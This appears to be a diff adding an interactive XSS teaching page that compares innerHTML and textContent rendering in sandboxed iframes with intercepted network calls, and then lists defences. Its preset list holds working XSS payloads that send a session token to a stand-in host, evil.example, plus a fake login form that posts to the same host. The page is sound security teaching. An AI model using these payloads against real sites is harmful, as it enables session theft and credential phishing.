@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ctext y=%22.9em%22 font-size=%2290%22%3E🏮%3C/text%3E%3C/svg%3E">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XSS lab</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400..800&family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/kit.css">
+  <script src="../assets/kit.js" defer></script>
+  <style>
+    .page.wire { --w-act: #ff6b5a; }
+    .input-row { display: flex; gap: 0.6rem; align-items: stretch; margin: 1.2rem 0 0.6rem; flex-wrap: wrap; }
+    .input-row label { width: 100%; font: 600 0.8rem "IBM Plex Mono", monospace; text-transform: uppercase; letter-spacing: 0.08em; color: var(--w-muted); }
+    #payload { flex: 1; min-width: 16rem; font: 500 0.95rem/1.4 "IBM Plex Mono", monospace; color: #fff; background: #040812; border: 1.5px solid var(--w-line); border-left: 4px solid var(--w-act); border-radius: 6px; padding: 0.6rem 0.8rem; font-variant-ligatures: none; }
+    .register { font: 700 0.95rem "Space Grotesk", sans-serif; color: #03101b; background: var(--w-act); border: 0; border-radius: 6px; padding: 0 1.2rem; cursor: pointer; }
+    .presets { display: flex; flex-wrap: wrap; gap: 0.4rem; margin: 0 0 1.2rem; }
+    .presets button { font: 500 0.78rem "IBM Plex Mono", monospace; color: var(--w-ink); background: transparent; border: 1.5px solid var(--w-line); border-radius: 99px; padding: 0.35rem 0.75rem; cursor: pointer; }
+    .presets button:hover, .presets button[aria-pressed="true"] { border-color: var(--w-act); color: #fff; }
+    .sides { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 1rem; }
+    .side { background: var(--w-bg2); border: 1.5px solid var(--w-line); border-radius: 8px; padding: 0.9rem; display: flex; flex-direction: column; gap: 0.6rem; min-width: 0; }
+    .side.unsafe { border-top: 4px solid #ff6b5a; } .side.safe { border-top: 4px solid #b6ff3b; }
+    .side h2 { margin: 0; font-size: 1.15rem; display: flex; justify-content: space-between; align-items: baseline; gap: 0.5rem; }
+    .side h2 small { font: 600 0.72rem "IBM Plex Mono", monospace; color: var(--w-muted); text-transform: uppercase; letter-spacing: 0.06em; }
+    .side pre.code { font-size: 0.8rem; margin: 0; }
+    .side iframe { width: 100%; height: 15rem; border: 1.5px solid var(--w-line); border-radius: 6px; background: #12151d; }
+    .ran { font: 600 0.8rem "IBM Plex Mono", monospace; color: var(--w-muted); }
+    .ran.hit { color: #ff6b5a; }
+    .log { margin-top: 1rem; background: #040812; border: 1.5px solid #5a2320; border-radius: 8px; padding: 0.8rem 1rem; }
+    .log h2 { margin: 0 0 0.5rem; font-size: 1.05rem; color: #ff8a70; }
+    .log ol { list-style: none; margin: 0; padding: 0; font: 500 0.85rem/1.5 "IBM Plex Mono", monospace; color: #ffb4a6; max-height: 12rem; overflow: auto; }
+    .log li { padding: 0.25rem 0; border-bottom: 1px solid #2a1414; overflow-wrap: anywhere; }
+    .log li small { color: var(--w-muted); margin-right: 0.5rem; }
+    .log .empty { color: var(--w-muted); }
+    .defences { display: grid; grid-template-columns: repeat(auto-fit, minmax(15rem, 1fr)); gap: 0.8rem; margin: 0.8rem 0 0; }
+    .defences div { background: var(--w-bg2); border: 1.5px solid var(--w-line); border-radius: 8px; padding: 0.8rem 1rem; }
+    .defences b { display: block; color: #fff; margin-bottom: 0.3rem; }
+    .defences p { margin: 0; font-size: 0.92rem; color: #cfdcf7; }
+    @media (width < 760px) { .sides { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body class="page wire">
+  <div class="page-wrap">
+    <div class="page-top"><a href="../index.html">← Data in, page out · all materials</a><span>Playground</span></div>
+    <span class="eyebrow-tag">Security · XSS</span>
+    <h1>XSS <em>lab</em></h1>
+    <p class="intro">Cross-site scripting: user input ends up in the page <strong>as HTML</strong>, so the browser parses it, and any markup or event handler in it becomes part of your application. Below, the same "register a stall" input is rendered twice: on the left with an <code>innerHTML</code> template string, on the right with <code>textContent</code>. Both previews belong to a logged-in organiser whose session token is in memory. Anything the injected code sends out shows up in the attacker's log at the bottom.</p>
+    <p class="intro" style="font-size:0.95rem">The previews are sandboxed iframes and outgoing requests are intercepted, so nothing leaves this page and nothing here can touch the rest of the site. For the <strong>stored</strong> variant (saved in <code>localStorage</code>, re-runs on every reload), see the <a href="stored-xss-forum.html">guestbook demo</a>.</p>
+
+    <div class="input-row">
+      <label for="payload">Stall name (user input)</label>
+      <input id="payload" autocomplete="off" spellcheck="false" value="Taco Bike">
+      <button class="register" type="button">Register</button>
+    </div>
+    <div class="presets" role="group" aria-label="Payloads"></div>
+
+    <div class="sides">
+      <section class="side unsafe">
+        <h2>innerHTML <small class="ran" data-for="unsafe">nothing sent</small></h2>
+        <pre class="code" data-lang="js">list.innerHTML += `
+  &lt;li class="stall" title="${stall.name}"&gt;
+    &lt;h3&gt;${stall.name}&lt;/h3&gt;
+  &lt;/li&gt;`;</pre>
+        <iframe class="frame-unsafe" sandbox="allow-scripts allow-forms" title="innerHTML version"></iframe>
+      </section>
+      <section class="side safe">
+        <h2>textContent <small class="ran" data-for="safe">nothing sent</small></h2>
+        <pre class="code" data-lang="js">const li = template.content.firstElementChild.cloneNode(true);
+li.title = stall.name;
+li.querySelector("h3").textContent = stall.name;
+list.append(li);</pre>
+        <iframe class="frame-safe" sandbox="allow-scripts allow-forms" title="textContent version"></iframe>
+      </section>
+    </div>
+
+    <section class="log" aria-live="polite">
+      <h2>evil.example · server log</h2>
+      <ol><li class="empty">Nothing received yet.</li></ol>
+    </section>
+
+    <h2>Try this</h2>
+    <ol class="tasks">
+      <li><b>Formatting</b>: the left side renders bold text. Harmless, but it proves the input is parsed as HTML.</li>
+      <li><b>onerror</b>: the image fails to load, the handler runs, the session token appears in the attacker's log. No click needed.</li>
+      <li><b>&lt;script&gt;</b>: nothing runs. Scripts inserted with <code>innerHTML</code> are never executed, which is why filtering out <code>&lt;script&gt;</code> is not a defence: preset 2 didn't need one.</li>
+      <li><b>Fake login</b>: no JavaScript at all, just injected markup. A convincing form on your domain, pointing at someone else's server.</li>
+      <li><b>Attribute breakout</b>: the input closes the <code>title="…"</code> attribute and adds its own <code>onmouseover</code>. Hover the left card. Escaping depends on where the value lands: text, attribute, URL.</li>
+      <li>Press Register a few times on the left with preset 2: every render re-parses the whole list (<code>+=</code>), so each payload runs again.</li>
+    </ol>
+
+    <h2>Defences, in order of preference</h2>
+    <div class="defences">
+      <div><b>1 · Don't parse user input as HTML</b><p><code>textContent</code>, <code>createElement</code>, <code>setAttribute</code>, a <code>&lt;template&gt;</code>. Values stay values in every context. This is what today's <code>card()</code> does.</p></div>
+      <div><b>2 · If you need HTML, sanitise it</b><p>For rich text from users: DOMPurify, or the Sanitizer API (<code>element.setHTML()</code>) where supported. Never a hand-written regex.</p></div>
+      <div><b>3 · Content Security Policy</b><p>A response header that blocks inline handlers and scripts from other origins. A second layer, not a fix: it limits the damage of a bug you didn't catch.</p></div>
+      <div><b>4 · Keep secrets out of reach</b><p>Session cookies with <code>HttpOnly</code> can't be read by JavaScript. Tokens in <code>localStorage</code> or in memory can: XSS reads them.</p></div>
+    </div>
+  </div>
+
+<script>
+(() => {
+  const PRESETS = [
+    ["1 · formatting", "<b>Taco</b> <i>Bike</i>"],
+    ["2 · onerror", "<img src=x onerror=fetch('https://evil.example/steal?token='+session.token)>Taco Bike"],
+    ["3 · <script>", "<script>fetch('https://evil.example/steal?token='+session.token)<\/script>Taco Bike"],
+    ["4 · fake login", "Taco Bike<form action='https://evil.example/login'><p style='color:#ffb547;margin:.4rem 0'>Session expired. Log in again:</p><input name='password' type='password' placeholder='Password'> <button>Log in</button></form>"],
+    ["5 · attribute breakout", "Taco Bike\" onmouseover=\"fetch('https://evil.example/steal?token='+session.token)"],
+  ];
+
+  // Runs inside both previews: a logged-in organiser, and a fake network
+  const SHIM = `<script>
+    window.session = { user: "marisol", token: "s3ss-7f2c-91ab" };
+    const report = (kind, detail) => parent.postMessage({ xss: true, side: document.documentElement.dataset.side, kind, detail }, "*");
+    window.fetch = (url) => { report("fetch", String(url)); return Promise.resolve(new Response("")); };
+    navigator.sendBeacon = (url) => { report("beacon", String(url)); return true; };
+    document.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const data = [...new FormData(e.target).values()].join(", ");
+      report("form", e.target.action + (data ? "  (typed: " + data + ")" : ""));
+    }, true);
+    addEventListener("DOMContentLoaded", () => setTimeout(() => parent.postMessage({ ready: document.documentElement.dataset.side }, "*"), 0));
+  <\/script>`;
+  const STYLE = `<style>
+    body { margin: 12px; background: #12151d; color: #f3ecdf; font: 15px/1.4 "Bricolage Grotesque", system-ui, sans-serif; }
+    ul { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
+    .stall { background: #1b202b; border: 2px solid #3a4254; border-radius: 10px; padding: 8px 12px; }
+    h3 { margin: 0; font-size: 17px; overflow-wrap: anywhere; }
+    input, button { font: inherit; }
+  </style>`;
+  const UNSAFE = `<!doctype html><html data-side="unsafe"><head><meta charset="utf-8">${STYLE}${SHIM}</head><body>
+    <ul class="list"><li class="stall" title="Dumpling Dynasty"><h3>Dumpling Dynasty</h3></li></ul>
+    <script>
+      const list = document.querySelector(".list");
+      addEventListener("message", (e) => {
+        const stall = { name: e.data };
+        list.innerHTML += \`<li class="stall" title="\${stall.name}"><h3>\${stall.name}</h3></li>\`;
+      });
+    <\/script><\/body><\/html>`;
+  const SAFE = `<!doctype html><html data-side="safe"><head><meta charset="utf-8">${STYLE}${SHIM}</head><body>
+    <ul class="list"><li class="stall" title="Dumpling Dynasty"><h3>Dumpling Dynasty</h3></li></ul>
+    <template id="t"><li class="stall"><h3></h3></li></template>
+    <script>
+      const list = document.querySelector(".list");
+      const template = document.querySelector("#t");
+      addEventListener("message", (e) => {
+        const stall = { name: e.data };
+        const li = template.content.firstElementChild.cloneNode(true);
+        li.title = stall.name;
+        li.querySelector("h3").textContent = stall.name;
+        list.append(li);
+      });
+    <\/script><\/body><\/html>`;
+
+  const unsafe = document.querySelector(".frame-unsafe");
+  const safe = document.querySelector(".frame-safe");
+  const input = document.querySelector("#payload");
+  const log = document.querySelector(".log ol");
+  const counts = { unsafe: 0, safe: 0 };
+  const frames = { unsafe, safe };
+  let pending = null; // a payload waiting for fresh previews
+
+  function reset() {
+    unsafe.srcdoc = UNSAFE;
+    safe.srcdoc = SAFE;
+    counts.unsafe = counts.safe = 0;
+    document.querySelectorAll(".ran").forEach((el) => { el.textContent = "nothing sent"; el.classList.remove("hit"); });
+  }
+  function register() {
+    unsafe.contentWindow.postMessage(input.value, "*");
+    safe.contentWindow.postMessage(input.value, "*");
+  }
+
+  const presetRow = document.querySelector(".presets");
+  PRESETS.forEach(([label, value]) => {
+    const b = document.createElement("button");
+    b.type = "button";
+    b.textContent = label;
+    b.addEventListener("click", () => {
+      presetRow.querySelectorAll("button").forEach((x) => x.setAttribute("aria-pressed", String(x === b)));
+      input.value = value;
+      pending = { unsafe: value, safe: value };
+      reset();
+    });
+    presetRow.append(b);
+  });
+  const resetBtn = document.createElement("button");
+  resetBtn.type = "button";
+  resetBtn.textContent = "↺ reset previews";
+  resetBtn.addEventListener("click", () => { reset(); log.innerHTML = '<li class="empty">Nothing received yet.</li>'; });
+  presetRow.append(resetBtn);
+
+  document.querySelector(".register").addEventListener("click", register);
+  input.addEventListener("keydown", (e) => { if (e.key === "Enter") register(); e.stopPropagation(); });
+
+  addEventListener("message", (e) => {
+    if (e.data && e.data.ready && pending && pending[e.data.ready] != null) {
+      frames[e.data.ready].contentWindow.postMessage(pending[e.data.ready], "*");
+      pending[e.data.ready] = null;
+      return;
+    }
+    if (!e.data || !e.data.xss) return;
+    counts[e.data.side]++;
+    const badge = document.querySelector(`.ran[data-for="${e.data.side}"]`);
+    badge.textContent = `attacker received data × ${counts[e.data.side]}`;
+    badge.classList.add("hit");
+    log.querySelector(".empty")?.remove();
+    const li = document.createElement("li");
+    const meta = document.createElement("small");
+    meta.textContent = `${new Date().toLocaleTimeString()} · ${e.data.kind} · from the ${e.data.side === "unsafe" ? "innerHTML" : "textContent"} page`;
+    li.append(meta, e.data.detail);   // textContent-style: the log itself must not be injectable
+    log.prepend(li);
+  });
+
+  reset();
+})();
+</script>
+</body>
+</html>
